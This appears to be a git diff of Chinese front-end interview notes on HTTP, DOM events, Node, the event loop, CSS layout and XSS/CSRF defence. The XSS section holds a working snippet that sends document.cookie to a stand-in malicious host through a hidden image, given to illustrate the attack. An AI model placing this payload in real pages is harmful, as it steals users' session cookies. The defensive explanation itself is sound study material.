+var socket = new WebSocket('ws://localhost:8080');
+// 打开Socket
+socket.onopen = function(event) {
+  // 发送一个初始化消息
+  socket.send('I am the client and I\'m listening!');
+  // 监听消息
+  socket.onmessage = function(event) {
+    console.log('Client received a message',event);
+  };
+  // 监听Socket的关闭
+  socket.onclose = function(event) {
+    console.log('Client notified socket has closed',event);
+  };
+  // 关闭Socket....
+  //socket.close()
+};
 ```
-open('GET','demo.php?rand=+Math.random()',true);//
-```
+#### HTML5新特性
 
+- 画布(Canvas) API
+- 地理(Geolocation) API
+-  音频、视频API(audio,video)
+-  localStorage和sessionStorage
+-  webworker, websocket
+-  header,nav,footer,aside,article,section
 
->Ajax请求的页面历史记录状态问题
+web worker是运行在浏览器后台的js程序，他不影响主程序的运行，是另开的一个js线程，可以用这个线程执行复杂的数据操作，然后把操作结果通过postMessage传递给主线程，这样在进行复杂且耗时的操作时就不会阻塞主线程了。
 
-可以通过锚点来记录状态，`location.hash`。让浏览器记录Ajax请求时页面状态的变化。
+### 网络知识相关
 
+#### http状态码
 
+301 Moved Permanently 永久重定向，资源已永久分配新的URI
+302 Found 临时重定向，资源已临时分配新URI
+303 See Other 临时重定向，期望使用GET定向获取
 
-还可以通过`HTML5`的`history.pushState`，来实现浏览器地址栏的无刷新改变
+400 (错误请求) 服务器不理解请求的语法。
 
+401 (未授权) 请求要求身份验证。 对于需要登录的网页，服务器可能返回此响应。
 
+403 (禁止) 服务器拒绝请求。
 
+404 (未找到) 服务器找不到请求的网页。
 
-#### 谈谈你对重构的理解
+405 (方法禁用) 禁用请求中指定的方法。
 
-网站重构：在不改变外部行为的前提下，简化结构、添加可读性，而在网站前端保持一致的行为。也就是说是在不改变UI的情况下，对网站进行优化，
-在扩展的同时保持一致的UI。
+500 (服务器内部错误) 服务器遇到错误，无法完成请求。
 
+501 (尚未实施) 服务器不具备完成请求的功能。 例如，服务器无法识别请求方法时可能会返回此代码。
 
-    对于传统的网站来说重构通常是：
+502 (错误网关) 服务器作为网关或代理，从上游服务器收到无效响应。
 
-    表格(table)布局改为DIV+CSS
+503 (服务不可用) 服务器目前无法使用(由于超载或停机维护)。 通常，这只是暂时状态。
 
-    使网站前端兼容于现代浏览器(针对于不合规范的CSS、如对IE6有效的)
+504 (网关超时) 服务器作为网关或代理，但是没有及时从上游服务器收到请求。
 
-    对于移动平台的优化
+#### http报头有哪些
 
-    针对于SEO进行优化
+请求头：
+1.Accept
+2.Cache-control
+3.Host
+4.User-agent
+5.Accenp-Language
 
-    深层次的网站重构应该考虑的方面
+响应头：
+1.Cache-Control:max-age  避免了服务端和客户端时间不一致的问题。
+2.content-type
+3.Date
+4.Expires
+5.Last-Modified   标记此文件在服务期端最后被修改的时间
 
+httpOnly 设置cookie是否能通过 js 去访问。在客户端是不能通过js代码去设置一个`httpOnly`类型的cookie的，这种类型的cookie只能通过服务端来设置。在发生跨域时，cookie 作为一种 credential 信息是不会被传送到服务端的。必须要进行额外设置才可以。
+#### 代理和反向代理
 
-    减少代码间的耦合
+正向代理： 用浏览器访问时，被残忍的block，于是你可以在国外搭建一台代理服务器，让代理帮我去请求google.com，代理把请求返回的相应结构再返回给我。
 
-    让代码保持弹性
+反向代理：反向代理服务器会帮我们把请求转发到真实的服务器那里去。Nginx就是性能非常好的反向代理服务器，用来做负载均衡。
+正向代理的对象是客户端，反向代理的对象是服务端
 
-    严格按规范编写代码
+#### CDN工作原理
 
-    设计可扩展的API
+CDN做了两件事，一是让用户访问最近的节点，二是从缓存或者源站获取资源
 
-    代替旧有的框架、语言(如VB)
+CDN的工作原理：通过dns服务器来实现优质节点的选择，通过缓存来减少源站的压力。
+#### 网络优化/性能优化
 
-    增强用户体验
+使用CDN，让用户访问最近的资源，减少来回传输时间
+合并压缩CSS、js、图片、静态资源，服务器开启GZIP
+css放顶部，js放底部（css可以并行下载，而js加载之后会造成阻塞）
+图片预加载和首屏图片之外的做懒加载
+做HTTP缓存（添加Expires头和配置Etag）用户可以重复使用本地缓存，减少对服务器压力
+大小超过 10KB 的 css/img 建议外联引用，以细化缓存粒度
+小于 10k 的图片 base64
+DNS 预解析 DNS-Prefetch
+预连接 Preconnect
+- 代码层面优化
 
-    通常来说对于速度的优化也包含在重构中
+少用全局变量，减少作用域链查找，缓存DOM查找结果，避免使用with（with会创建自己的作用域，会增加作用域链长度）；多个变量声明合并；减少DOM操作次数；尽量避免在HTML标签中写style属性
 
+避免使用css3渐变阴影效果，尽量使用css3动画，开启硬件加速，不滥用float；避免使用CSS表达式；使用`<link>`来代替`@import`
 
 
-    压缩JS、CSS、image等前端资源(通常是由服务器来解决)
+- 图片预加载原理
 
-    程序的性能优化(如数据读写)
-
-    采用CDN来加速资源加载
-
-    对于JS DOM的优化
-
-    HTTP服务器的文件缓存
-
-
-#### HTTP状态码
-
-
-```html
-
-    100  Continue  继续，一般在发送post请求时，已发送了http header之后服务端将返回此信息，表示确认，之后发送具体参数信息
-
-    200  OK   正常返回信息
-
-    201  Created  请求成功并且服务器创建了新的资源
-
-    202  Accepted  服务器已接受请求，但尚未处理
-
-    301  Moved Permanently  请求的网页已永久移动到新位置。
-
-    302 Found  临时性重定向。
-
-    303 See Other  临时性重定向，且总是使用 GET 请求新的 URI。
-
-    304  Not Modified  自从上次请求后，请求的网页未修改过。
-
-
-    400 Bad Request  服务器无法理解请求的格式，客户端不应当尝试再次使用相同的内容发起请求。
-
-    401 Unauthorized  请求未授权。
-
-    403 Forbidden  禁止访问。
-
-    404 Not Found  找不到如何与 URI 相匹配的资源。
-
-    500 Internal Server Error  最常见的服务器端错误。
-
-    503 Service Unavailable 服务器端暂时无法处理请求（可能是过载或维护）。
-
-```
-
-
-#### 说说你对Promise的理解
-
-
-
-依照 `Promise/A+` 的定义，`Promise` 有四种状态：
-
-	pending: 初始状态, 非 fulfilled 或 rejected.
-
-	fulfilled: 成功的操作.
-
-	rejected: 失败的操作.
-
-	settled: Promise已被fulfilled或rejected，且不是pending
-
-
-
-另外， `fulfilled` 与 `rejected` 一起合称 `settled`。
-
-
-
-`Promise` 对象用来进行延迟(deferred) 和异步(asynchronous ) 计算。
-
-
-
->Promise 的构造函数
-
-
-
-构造一个 `Promise`，最基本的用法如下：
-
-
-```js
-	var promise = new Promise(function(resolve, reject) {
-
-	    if (...) {  // succeed
-
-	        resolve(result);
-
-	    } else {   // fails
-
-	        reject(Error(errMessage));
-
-	    }
-	});
+提前加载图片，当用户需要查看时可直接从本地缓存中渲染
+```javascript
+var imgArr=["1.jpg","2.jpg"];
+loadImage(imgArr,callback);
+function loadImage(imgArr, callback) {
+    var imgNum=imgArr.length,count=0;
+    for(var i=0;i<imgNum;i++){
+      var img = new Image(); //创建一个Image对象，实现图片的预下载
+      img.src = imgArr[i];
+      if (img.complete) { // 如果图片已经存在于浏览器缓存，直接调用回调函数
+          if(count==imgNum){
+          callback();// 直接返回，不用再处理onload事件
+         }
+ } count++; img.onload=function () { if(count==imgNum){ callback(); } } }//for循环结束}
 ```
 
 
-`Promise` 实例拥有 `then` 方法（具有 `then` 方法的对象，通常被称为 `thenable`）。它的使用方法如下：
+### 原生DOM操作和事件相关
 
-```js
-promise.then(onFulfilled, onRejected)
-```
-
-接收两个函数作为参数，一个在 `fulfilled` 的时候被调用，一个在 `rejected` 的时候被调用，接收参数就是 `future，onFulfilled` 对应 `resolve`, `onRejected` 对应 `reject`。
-
-
-
-#### 说说你对前端架构师的理解
+- 如需替换 HTML DOM 中的元素，请使用` replaceChild(newnode,oldnode) `方法
+- 从父元素中删除子元素 `parent.removeChild(child)`;
+- `insertBefore(newItem,existingItem)` 在指定的已有子节点之前插入新的子节点
+- `appendChild(newListItem`向元素添加新的子节点，作为最后一个子节点
+document.documentElement - 全部文档
+document.body - 文档的主体
 
 
-负责前端团队的管理及与其他团队的协调工作，提升团队成员能力和整体效率；
-带领团队完成研发工具及平台前端部分的设计、研发和维护；
-带领团队进行前端领域前沿技术研究及新技术调研，保证团队的技术领先
-负责前端开发规范制定、功能模块化设计、公共组件搭建等工作，并组织培训。
+http://www.w3school.com.cn/jsref/dom_obj_all.asp
 
+- JS事件：target与currentTarget区别
+target在事件流的目标阶段；currentTarget在事件流的捕获，目标及冒泡阶段。只有当事件流处在目标阶段的时候，两个的指向才是一样的， 而当处于捕获和冒泡阶段的时候，target指向被单击的对象而currentTarget指向当前事件活动的对象（一般为父级）。
 
+#### 事件模型
 
-#### 实现一个函数clone，可以对JavaScript中的5种主要的数据类型（包括Number、String、Object、Array、Boolean）进行值复制
+事件捕捉阶段：事件开始由顶层对象触发，然后逐级向下传播，直到目标的元素；
+处于目标阶段：处在绑定事件的元素上；
+事件冒泡阶段：事件由具体的元素先接收，然后逐级向上传播，直到不具体的元素；
+- 阻止 冒泡／捕获 `event.stopPropagation()`和IE的`event.cancelBubble=true`
 
+- DOM事件绑定
+1.绑定事件监听函数：addEventListener和attchEvent
+2.在JavaScript代码中绑定：获取DOM元素 `dom.onlick = fn`
+3.在DOM元素中直接绑定：`<div onclick = 'fn()'>`
 
-```js
-    Object.prototype.clone = function(){
+DOM事件流包括三个阶段：事件捕获阶段、处于目标阶段、事件冒泡阶段。首先发生的事件捕获，为截获事件提供机会。然后是实际的目标接受事件。最后一个阶段是时间冒泡阶段，可以在这个阶段对事件做出响应。
+#### 事件委托
 
-            var o = this.constructor === Array ? [] : {};
+因为事件具有冒泡机制，因此我们可以利用冒泡的原理，把事件加到父级上，触发执行效果。这样做的好处当然就是提高性能了
 
-            for(var e in this){
+最重要的是通过`event.target.nodeName`判断子元素
 
-                    o[e] = typeof this[e] === "object" ? this[e].clone() : this[e];
+```javascript
+<div>
+    <ul id = "bubble">
+        <li>1</li>
+        <li>2</li>
+        <li>3</li>
+        <li>4</li>
+    </ul>
+</div>
 
+   window.onload = function () {
+        var aUl = document.getElementsById("bubble");
+        var aLi = aUl.getElementsByTagName("li");
+
+        //不管在哪个事件中，只要你操作的那个元素就是事件源。
+        // ie：window.event.srcElement
+        // 标准下:event.target
+        aUl.onmouseover = function (ev) {
+            var ev = ev || window.event;
+            var target = ev.target || ev.srcElement;
+
+            if(target.nodeName.toLowerCase() == "li"){
+                target.style.background = "blue";
             }
-
-            return o;
-    }
+        };
+   };
 ```
 
-#### 说说严格模式的限制
+### 首屏优化
+
+再回到前端渲染遇到首屏渲染问题，除了同构就没有其它解法了吗？总结以下可以通过以下三步解决
+
+分拆打包
+现在流行的路由库如 react-router 对分拆打包都有很好的支持。可以按照页面对包进行分拆，并在页面切换时加上一些 loading 和 transition 效果。
+
+1.首屏内容最好做到静态缓存
+2.首屏内联css渲染
+3.图片懒加载
+4.服务端渲染，首屏渲染速度更快（重点），无需等待js文件下载执行的过程
+5.交互优化（使用加载占位器，在白屏无法避免的时候，为了解决等待加载过程中白屏或者界面闪烁）
+6.图片尺寸大小控制
+
+
+### 前端渲染的优势
+
+- 局部刷新。无需每次都进行完整页面请求
+- 懒加载。如在页面初始时只加载可视区域内的数据，滚动后rp加载其它数据，可以通过 react-lazyload 实现
+- 富交互。使用 JS 实现各种酷炫效果
+- 节约服务器成本。省电省钱，JS 支持 CDN 部署，且部署极其简单，只需要服务器支持静态文件即可
+- 天生的关注分离设计。服务器来访问数据库提供接口，JS 只关注数据获取和展现
+- JS 一次学习，到处使用。可以用来开发 Web、Serve、Mobile、Desktop 类型的应用
+
+### 服务端渲染的优势
+
+
+- 更好的 SEO，由于搜索引擎爬虫抓取工具可以直接查看完全渲染的页面。
+
+- 服务端渲染不需要先下载一堆 js 和 css 后才能看到页面（首屏性能）
+- 服务端渲染不用关心浏览器兼容性问题（随意浏览器发展，这个优点逐渐消失）
+- 对于电量不给力的手机或平板，减少在客户端的电量消耗很重要
 
 
 
-严格模式主要有以下限制：
+### apply, call和bind有什么区别?
 
-    变量必须声明后再使用
+参考答案：三者都可以把一个函数应用到其他对象上，call、apply是修改函数的作用域（修改this指向），并且立即执行，而bind是返回了一个新的函数，不是立即执行．apply和call的区别是apply接受数组作为参数，而call是接受逗号分隔的无限多个参数列表，
 
-    函数的参数不能有同名属性，否则报错
+```javascript
+Array.prototype.slice.call(null, args)
 
-    不能使用with语句
+function getMax(arr){
+  return Math.max.apply(null, arr);
+}
+//call
+function foo() {
+  console.log(this);//{id: 42}
+}
 
-    不能对只读属性赋值，否则报错
-
-    不能使用前缀0表示八进制数，否则报错
-
-    不能删除不可删除的属性，否则报错
-
-    不能删除变量delete prop，会报错，只能删除属性delete global[prop]
-
-    eval不会在它的外层作用域引入变量
-
-    eval和arguments不能被重新赋值
-
-    arguments不会自动反映函数参数的变化
-
-    不能使用arguments.callee
-
-    不能使用arguments.caller
-
-    禁止this指向全局对象
-
-    不能使用fn.caller和fn.arguments获取函数调用的堆栈
-
-    增加了保留字（比如protected、static和interface）
+foo.call({ id: 42 });
+```
+如果该方法是非严格模式代码中的函数，则null和undefined将替换为全局对象，并且原始值将被包装。
+当你调用apply传递给它null时，就像是调用函数而不提供任何对象
 
 
+### XSS和CSRF 防御
 
-设立"严格模式"的目的，主要有以下几个：
+XSS和CSRF都属于跨站攻击，XSS是实现CSRF诸多途径中的一条，但不是唯一一条
 
+xss的本质是让对方浏览器执行你插入的js ，来获取cookie等信息；csrf是借用用户的身份，向服务器发送请求
 
-- 消除`Javascript`语法的一些不合理、不严谨之处，减少一些怪异行为;
+XSS分为存储型和反射型：
+- 存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie等
+- 反射型XSS，非持久化，需要欺骗用户自己去点击链接才能触发XSS代码。发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS
 
-- 消除代码运行的一些不安全之处，保证代码运行的安全；
+#### XSS防范：
 
-- 提高编译器效率，增加运行速度；
+1）客户端校验用户输入信息，只允许输入合法的值，其他一概过滤掉，防止客户端输入恶意的js代码被植入到HTML代码中，使得js代码得以执行
+ - 移除用户上传的DOM属性，如onerror等
+ - 移除用户上传的style节点，script节点，iframe节点等
+2）对用户输入的代码标签进行转换（html encode）
+3）对url中的参数进行过滤
+4）对动态输出到页面的内容进行HTML编码
+5）服务端对敏感的Cookie设置 httpOnly属性，使js脚本不能读取到cookie
+6)  CSP 即是 Content Security Policy
 
-- 为未来新版本的`Javascript`做好铺垫。
+```javascript
+var img = document.createElement('img');
+img.src='http://www.xss.com?cookie='+document.cookie;
+img.style.display='none';
+document.getElementsByTagName('body')[0].appendChild(img);
 
-
-
-注：经过测试`IE6,7,8,9`均不支持严格模式。
-
-
-
-
-#### 如何删除一个cookie
-
-
-
->1.将时间设为当前时间往前一点。
-
-
-```js
-var date = new Date();
-
-date.setDate(date.getDate() - 1);//真正的删除
+//这样就神不知鬼不觉的把当前用户的cookie发送给了我的恶意站点，我的恶意站点通过获取get参数就拿到了用户的cookie。当然我们可以通过这个方法拿到用户各种各样的数据。
 ```
 
+目前很多浏览器都会自身对用户的输入进行判断，检测是否存在攻击字符，比如你上述提到的`<script>`标签，这段脚本很明显就是一段xss攻击向量，因此浏览器会对这段输入进行处理，不同的浏览器处理方式也不一样。可以在浏览器中将这个拦截关闭
 
-`setDate() `方法用于设置一个月的某一天。
 
->2.expires的设置
+#### 跨站请求伪造的过程与防范：
 
-```js
-    document.cookie = 'user='+ encodeURIComponent('name')  + ';expires = ' + new Date(0)
+http://www.imooc.com/article/13552
+
+过程：用户小明在你的网站A上面登录了，A返回了一个session ID（使用cookie存储）,小明的浏览器保持着A网站的登录状态，攻击者小强给小明发送了一个链接地址，小明打开了地址的时候，这个页面已经自动的对网站a发送了一个请求，通过使用小明的cookie信息，这样攻击者小强就可以随意更改小明在A上的信息。
+
+1）使用token：服务器随机产生tooken，然后以tooken为秘钥产生一段密文，把token和密文都随cookie交给前端，前端发起请求时把密文和token交给后端，后端对token和密文进行验证，看token能不能生成同样的密文，这样即使黑客拿到了token也无法拿到密文
 ```
-
-
-#### `<strong>`，`<em>`和`<b>`，`<i>`标签
-
-
-```html
-<strong> 标签和 <em> 标签一样，用于强调文本，但它强调的程度更强一些。
-
-em 是 斜体强调标签，更强烈强调，表示内容的强调点。相当于html元素中的 <i>...</i>;
-
-< b > < i >是视觉要素，分别表示无意义的加粗，无意义的斜体。
-
-em 和 strong 是表达要素(phrase elements)。
-```
-
-
-#### 说说你对AMD和Commonjs的理解
-
-
-
-`CommonJS`是服务器端模块的规范，Node.js采用了这个规范。`CommonJS`规范加载模块是同步的，也就是说，只有加载完成，才能执行后面的操作。AMD规范则是非同步加载模块，允许指定回调函数。
-
-`AMD`推荐的风格通过返回一个对象做为模块对象，`CommonJS`的风格通过对`module.exports`或`exports`的属性赋值来达到暴露模块对象的目的。
-
->详情：[也谈webpack及其开发模式](https://segmentfault.com/a/1190000004888589)
-
-#### document.write()的用法
-
-
-
-` document.write()`方法可以用在两个方面：页面载入过程中用实时脚本创建页面内容，以及用延时脚本创建本窗口或新窗口的内容。
-
-`document.write`只能重绘整个页面。`innerHTML`可以重绘页面的一部分
-
-
-#### 编写一个方法 求一个字符串的字节长度
-
-假设：一个英文字符占用一个字节，一个中文字符占用两个字节
-
-```js
- function GetBytes(str){
-
-        var len = str.length;
-
-        var bytes = len;
-
-        for(var i=0; i<len; i++){
-
-            if (str.charCodeAt(i) > 255) bytes++;
-
-        }
-
-        return bytes;
-
-    }
-
-alert(GetBytes("你好,as"));
+http://www.weibo.cn?follow_uid=123&token=73ksdkfu102
 ```
 
 
-### git fetch和git pull的区别
+2）使用验证码：每一个重要的post提交页面，使用一个验证码，因为第三方网站是无法获得验证码的
+
+3）检测http的头信息refer。Referer记录了请求的来源地址，服务器要做的是验证这个来源地址是否合法
+
+4）涉及敏感操作的请求改为POST请求
 
 
-```js
-git pull：相当于是从远程获取最新版本并merge到本地
 
-git fetch：相当于是从远程获取最新版本到本地，不会自动merge
+
+### Node面试题
+
+- 核心模块：EventEmitter, Stream, FS, Net和全局对象
+- 全局对象：process, console, Buffer和exports
+
+- `exports`和`module.exports`区别
+
+`exports` 是 `module.exports` 的一个引用
+module.exports 初始值为一个空对象 {}，所以 exports 初始值也是 {}
+require 引用模块后，返回的是 module.exports 而不是 exports
+
+#### 单线程优点
+Node.js依托于v8引擎，都是以单线程为基础的。单线程资源占用小。单线程避免了传统PHP那样频繁创建、切换线程的开销，使执行速度更加迅速
+
+#### Node.js是如何做到I/O的异步和非阻塞的呢
+
+其实Node在底层访问I/O还是多线程的。Node可以借助livuv来来实现多线程。
+
+
+如果我们非要让Node.js支持多线程，还是提倡使用官方的做法，利用libuv库来实现。
+
+
+cluster可以用来让Node.js充分利用多核cpu的性能
+#### 并行与并发，进程与线程
+并发 (Concurrent) = 2 队列对应 1 咖啡机.
+
+并行 (Parallel) = 2 队列对应 2 咖啡机.
+
+线程是进程下的执行者，一个进程至少会开启一个线程（主线程），也可以开启多个线程。
+
+#### 谈谈Nodejs优缺点
+
+优点：
+事件驱动，异步编程，占用内存少
+npm设计得好
+
+ Node.js 缺点：
+
+1.Debug 很困难。没有 stack trace，出了问题很难查找问题的原因；
+
+2.如果设计不好，很容易让代码充满 callback，代码不优雅；
+
+3.可靠性低；
+4.单进程，单线程，只支持单核CPU，不能充分的利用多核CPU服务器。
+
+### 美团面试
+
+1.事件循环
+
+浏览器中, js引擎线程会循环从 任务队列 中读取事件并且执行, 这种运行机制称作 Event Loop (事件循环).
+
+- 事件循环 setTimeout与Promise
+
+每个浏览器环境，至多有一个event loop。
+一个event loop可以有1个或多个task queue(任务队列)
+
+先执行同步的代码，然后js会跑去消息队列中执行异步的代码，异步完成后，再轮到回调函数，然后是去下个事件循环中执行setTimeout
+
+它从script(整体代码)开始第一次循环。之后全局上下文进入函数调用栈。直到调用栈清空(只剩全局)，然后执行所有的micro-task。当所有可执行的micro-task执行完毕之后。循环再次从macro-task开始，找到其中一个任务队列执行完毕，然后再执行所有的micro-task，这样一直循环下去。
+
+
+
+从规范上来讲，setTimeout有一个4ms的最短时间，也就是说不管你设定多少，反正最少都要间隔4ms才运行里面的回调。而Promise的异步没有这个问题。Promise所在的那个异步队列优先级要高一些
+Promise是异步的，是指他的then()和catch()方法，Promise本身还是同步的
+Promise的任务会在当前事件循环末尾中执行，而setTimeout中的任务是在下一次事件循环执行
+
+```
+//12354
+setTimeout(function(){
+  console.log(4)
+  },0);
+new Promise(function(resolve){
+  console.log(1)
+  for( var i=0 ; i<10000 ; i++ ){
+    i===9999 && resolve()
+  }
+  console.log(2)
+}).then(function(){
+  console.log(5)
+});
+console.log(3);
+
+```
+
+2.xss和csrf
+3.事件捕获的应用
+4.jsx的优点
+5、webpack loader和plugin区别
+6.性能优化
+7.react和vue的区别
+8.vue component和指令的区别
+9.vue组件通信
+10.box-sizing
+11.jsonp缺点，为什么不能用POST
+12.vue-router的实现原理
+13.es6用了哪些新特性
+14、cookie和localStorage区别
+15、git fetch是干嘛的
+16、事件代理和冒泡，捕获
+17、304是干嘛的 具体，405 504又是干嘛的
+18、BFC
+19、其他（自我介绍，为啥离职，为啥从美团离职，git工作流，code review，单元测试）
+20、react组件生命周期
+21.伪类和伪元素的区别
+CSS 伪类：逻辑上存在但在文档树中却无须标识的“幽灵”分类
+CSS 伪元素（`:first-letter，:first-line,:after,:before`）代表了某个元素的子元素，这个子元素虽然在逻辑上存在，但却并不实际存在于文档树中。
+CSS3标准要求伪元素使用双冒号
+22.em和rem
+
+### 饿了么面试
+
+1.什么是类数组对象，如何将类数组对象转为真正的数组
+
+拥有length属性和若干索引属性的对象,
+类数组只有索引值和长度，没有数组的各种方法，所以如果要类数组调用数组的方法，就需要使用 Array.prototype.method.call 来实现。
+
+```javascript
+var arrayLike = {0: 'name', 1: 'age', 2: 'sex', length: 3 }
+// 1. slice
+Array.prototype.slice.call(arrayLike); // ["name", "age", "sex"]
+// 2. splice
+Array.prototype.splice.call(arrayLike, 0); // ["name", "age", "sex"]
+// 3. ES6 Array.from
+Array.from(arrayLike); // ["name", "age", "sex"]
+// 4. apply
+Array.prototype.concat.apply([], arrayLike)
+```
+2.跨域
+
+3.伪元素和伪类
+
+伪类用于当已有元素处于的某个状态时，为其添加对应的样式，这个状态是根据用户行为而动态变化的。
+
+```javascript
+a:link
+:first-child
+:nth-child
+:focus
+:visited
+```
+伪元素代表了某个元素的子元素，这个子元素虽然在逻辑上存在，但却并不实际存在于文档树中。
+
+4.bind返回什么
+
+bind() 方法会返回一个新函数, 又叫绑定函数, 当调用这个绑定函数时, 绑定函数会以创建它时传入 bind() 方法的第一个参数作为当前的上下文, 即this, 传入 bind() 方法的第二个及之后的参数加上绑定函数运行时自身的参数按照顺序作为原函数的参数来调用原函数.
+
+```javascript
+var x = 8;
+var o = {
+  x: 10,
+  getX: function(){
+  	console.log(this.x);
+  }
+};
+var f = o.getX;
+f();//8, 由于没有绑定执行时的上下文, this默认指向window, 打印了全局变量x的值
+var g = f.bind(o);
+g();//10, 绑定this后, 成功的打印了o对象的x属性的值.
+```
+5.git rebase和git merge的区别
+
+merge操作会生成一个新的节点，之前的提交分开显示。而rebase操作不会生成新的节点，是将两个分支融合成一个线性的提交。
+
+6.箭头函数
+箭头函数没有它自己的this值，箭头函数内的this值继承自外围作用域
+
+箭头函数不能用作构造器，不能和new一起使用
+箭头函数没有原型属性
+yield关键字不能在箭头函数使用
+在以下场景中不要使用箭头函数去定义：
+
+- 定义对象方法、定义原型方法、定义构造函数、定义事件回调函数。
+
+7.== 和`===`的区别
+
+相等运算符在比较相同类型的数据时，与严格相等运算符完全一样。
+
+在比较不同类型的数据时，相等运算符会先将数据进行类型转换，然后再用严格相等运算符比较。
+
+
+
+### new操作符具体做了什么
+
+1、创建一个空对象，并且this变量引用该对象，同时继承了该函数的原型（实例对象通过`__proto__`属性指向原型对象；`obj.__proto__ = Base.prototype;`）
+2、属性和方法被加入到 this 引用的对象中。
+
+```javascript
+function Animal(name) {
+    this.name = name;
+}
+
+Animal.prototype.run = function() {
+    console.log(this.name + 'can run...');
+}
+
+var cat = new Animal('cat');
+//模拟过程
+new Animal('cat')=function(){
+    let obj={};  //创建一个空对象
+    obj.__proto__=Animal.prototype;
+    //把该对象的原型指向构造函数的原型对象，就建立起原型了：obj->Animal.prototype->Object.prototype->null
+    return Animal.call(obj,'cat');// 绑定this到实例化的对象上
+}
 ```
 
 
+### 开放性问题
 
+#### 谈谈你对组件的看法，什么样的组件才是好的组件
 
-#### 说说你对MVC和MVVM的理解
+一个组件应该有以下特征：
 
->`MVC`
-
-    View 传送指令到 Controller
-
-    Controller 完成业务逻辑后，要求 Model 改变状态
-
-    Model 将新的数据发送到 View，用户得到反馈
-
-
-
-所有通信都是单向的。
-
-`Angular`它采用双向绑定（data-binding）：`View`的变动，自动反映在 `ViewModel`，反之亦然。
-
-
-    组成部分Model、View、ViewModel
-
-    View：UI界面
-
-    ViewModel：它是View的抽象，负责View与Model之间信息转换，将View的Command传送到Model；
-
-    Model：数据访问层
-
-
-#### 请解释什么是事件代理
+可组合（Composeable）：一个组件易于和其它组件一起使用，或者嵌套在另一个组件内部。如果一个组件内部创建了另一个组件，那么说父组件拥有（own）它创建的子组件，通过这个特性，一个复杂的 UI 可以拆分成多个简单的 UI 组件；
+可重用（Reusable）：每个组件都是具有独立功能的，它可以被使用在多个 UI 场景；
+可维护（Maintainable）：每个小的组件仅仅包含自身的逻辑，更容易被理解和维护；
+可测试（Testable）：因为每个组件都是独立的，那么对于各个组件分别测试显然要比对于整个 UI 进行测试容易的多。
 
 
 
-事件代理（Event Delegation），又称之为事件委托。是 `JavaScript` 中常用绑定事件的常用技巧。顾名思义，“事件代理”即是把原本需要绑定的事件委托给父元素，让父元素担当事件监听的职务。事件代理的原理是`DOM`元素的事件冒泡。使用事件代理的好处是可以提高性能。
+### CSS相关
+
+#### box-sizing盒模型
+
+![Alt text](./1503235984536.png)
+
+box-sizing属性主要用来控制元素的盒模型的解析模式。默认值是content-box。
+
+- content-box：让元素维持W3C的标准盒模型。元素的宽度/高度由border + padding + content的宽度/高度决定，设置width/height属性指的是content部分的宽/高
+
+- border-box：让元素维持IE传统盒模型（IE6以下版本和IE6~7的怪异模式）。设置width/height属性指的是border + padding + content
+
+- 应用场景：统一风格的表单元素
+表单中有一些input元素其实还是展现的是传统IE盒模型，带有一些默认的样式，而且在不同平台或者浏览器下的表现不一，造成了表单展现的差异。此时我们可以通过box-sizing属性来构建一个风格统一的表单元素。
 
 
+#### 水平垂直居中的方法
 
-#### attribute和property的区别是什么？
+>行内布局
 
+line-height + text-align
+vertical-align + text-align
 
+>块布局
 
-`attribute`是`dom`元素在文档中作为`html`标签拥有的属性；
+position absolute + margin auto
+position absolute + negative margin
+position absolute + translate(-50%, -50%)
 
+##### 父容器子容器不确定宽高的块级元素，做上下居中
 
-`property`就是`dom`元素在`js`中作为对象拥有的属性。
-
-
-
-所以：
-
-对于`html`的标准属性来说，`attribute`和`property`是同步的，是会自动更新的，
-
-但是对于自定义的属性来说，他们是不同步的，
-
-
-
-#### 说说网络分层里七层模型是哪七层
-
-- 应用层：应用层、表示层、会话层（从上往下）（`HTTP、FTP、SMTP、DNS`）
-
-- 传输层（`TCP`和`UDP`）
-
-- 网络层（`IP`）
-
-- 物理和数据链路层（以太网）
-
-
-
->每一层的作用如下：
-
-```js
-
-物理层：通过媒介传输比特,确定机械及电气规范（比特Bit）
-数据链路层：将比特组装成帧和点到点的传递（帧Frame）
-网络层：负责数据包从源到宿的传递和网际互连（包PackeT）
-传输层：提供端到端的可靠报文传递和错误恢复（段Segment）
-会话层：建立、管理和终止会话（会话协议数据单元SPDU）
-表示层：对数据进行翻译、加密和压缩（表示协议数据单元PPDU）
-应用层：允许访问OSI环境的手段（应用协议数据单元APDU）
+1.flex
+```
+#wrap{
+	display:flex;
+	justify-content:center;
+	align-items:center;
+}
 ```
 
->各种协议
+2.tabel
 
-`ICMP协议`： 因特网控制报文协议。它是TCP/IP协议族的一个子协议，用于在IP主机、路由器之间传递控制消息。
-`TFTP协议`： 是TCP/IP协议族中的一个用来在客户机与服务器之间进行简单文件传输的协议，提供不复杂、开销不大的文件传输服务。
-`HTTP协议`： 超文本传输协议，是一个属于应用层的面向对象的协议，由于其简捷、快速的方式，适用于分布式超媒体信息系统。
-`DHCP协议`： 动态主机配置协议，是一种让系统得以连接到网络上，并获取所需要的配置参数手段。
+```
+.parent {
+   text-align: center;//水平居中
+   display: table-cell;
+   vertical-align: middle;//垂直居中
+}
+.child {
+    display: inline-block;//防止块级元素宽度独占一行，内联元素可不设置
+}
+```
+
+3.absolute+transform 水平垂直居中
+```
+<div class="parent">
+  <div class="child">Demo</div>
+</div>
+
+<style>
+  .parent {
+    position: relative;
+  }
+  .child {
+    position: absolute;
+    left: 50%;
+    top: 50%;
+    transform: translate(-50%, -50%);
+  }
+</style>
+```
+4.webkit-box
+```
+//对父级元素设置
+position: relative;
+display: -webkit-box;
+-webkit-box-align: center;
+-webkit-box-pack: center;
+```
+
+#### 实现左边定宽右边自适应效果
+
+1.table(父级元素)与tabel-cell（两个子集元素）
+
+2.flex(父级元素)+flex :1（右边子元素）
+
+3.左边定宽，并且左浮动；右边设置距离左边的宽度
+
+4.左边定宽，左边设置position:absolute；右边设置距离左边的宽度
+#### 三列布局（中间固定两边自适应宽度）
+
+1.采用浮动布局（左边左浮动，右边右浮动，中间margin：0  宽度值）
+2.绝对定位方式（左右绝对定位，左边left0右边right0，中间上同）
+
+#### BFC（Block Formatting Contexts）块级格式化上下文
+
